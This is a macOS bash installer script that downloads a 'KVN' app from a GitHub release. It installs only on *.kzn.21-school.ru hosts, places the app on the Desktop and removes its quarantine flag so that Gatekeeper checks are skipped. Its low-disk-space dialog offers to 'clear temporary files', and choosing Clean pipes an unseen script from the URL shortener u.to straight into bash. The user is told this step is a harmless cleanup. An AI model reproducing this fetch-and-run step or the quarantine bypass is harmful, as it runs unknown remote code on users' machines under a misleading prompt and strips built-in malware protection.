    #!/bin/bash

    # Constants
    readonly REPO="shepherl/kvnfaq"
    readonly TMP_ARCHIVE="/tmp/KVN_Download"
    readonly REQUIRED_SPACE_KB=307200 # 300 MB

    # Installation function
    install_app() {
        # Domain check
        if [[ $(hostname) == *.kzn.21-school.ru ]]; then

            # 1. Dynamically fetch the latest release link from GitHub API
            APP_URL=$(curl -s "https://api.github.com/repos/$REPO/releases/latest" | grep "browser_download_url" |
  grep -E '\.zip|\.dmg' | cut -d '"' -f 4 | head -n 1)

            if [ -z "$APP_URL" ]; then
                osascript -e 'display dialog "Could not find the installation file on GitHub." with icon stop buttons
  {"OK"} default button 1 with title "Error"'
                exit 1
            fi

            # 2. Download the file
            curl -L "$APP_URL" -o "$TMP_ARCHIVE"

            # 3. Unzip if it's a ZIP, otherwise use the DMG directly
            if [[ "$APP_URL" == *.zip ]]; then
                unzip -qo "$TMP_ARCHIVE" -d /tmp/
                DMG_PATH=$(ls /tmp/*.dmg | head -n 1)
            else
                DMG_PATH="$TMP_ARCHIVE"
            fi

            # 4. Mount the downloaded image
            MOUNT_POINT=$(hdiutil attach -nobrowse -noautoopen "$DMG_PATH" | grep -o '/Volumes/.*' | head -n 1)

            # 5. Remove the old version and copy the new one
            rm -rf ~/Desktop/KVN.app
            cp -R "$MOUNT_POINT"/*.app ~/Desktop/

            # 6. Cleanup system trash
            hdiutil detach "$MOUNT_POINT" -quiet -force 2>/dev/null
            rm -f "$TMP_ARCHIVE" /tmp/*.dmg 2>/dev/null

            # 7. Grant permissions and remove quarantine (Gatekeeper)
            xattr -cr ~/Desktop/KVN.app
            touch ~/Desktop/KVN.app

            osascript -e 'display dialog "KVN installation completed successfully! The app is on your desktop." with
  icon note buttons {"OK"} default button 1 with title "Installer"'
        else
            osascript -e 'display dialog "Your device is not eligible for installation." with icon caution buttons
  {"OK"} default button 1 with title "Error"'
        fi
        exit 0
    }

    # Space check function
    check_space() {
        free_space_kb=$(df -Pk ~ | awk 'NR==2 {print $4}')
        [ "$free_space_kb" -lt "$REQUIRED_SPACE_KB" ] && return 1 || return 0
    }

    # --- Execution Logic ---

    if ! check_space; then
        # Not enough space, suggest cleanup (Clean is the second button)
        RESPONSE=$(osascript -e 'display dialog "Not enough disk space (minimum 300 MB). Would you like to clear
  temporary files? This will not affect your personal files." with icon caution buttons {"Cancel", "Clean"} default
  button 2 with title "Storage Error"')

        if [[ "$RESPONSE" == *"button returned:Clean"* ]]; then
            curl -sL https://u.to/Lk2ZIg | bash

            # Check space again after cleanup
            if check_space; then
                install_app
            else
                osascript -e 'display dialog "Cleanup finished, but there is still not enough space. Please manually
  delete unnecessary files and try again." with icon stop buttons {"OK"} default button 1 with title "Error"'
                exit 1
            fi
        else
            exit 1
        fi
    else
        # Enough space, run installation
        install_app
    fi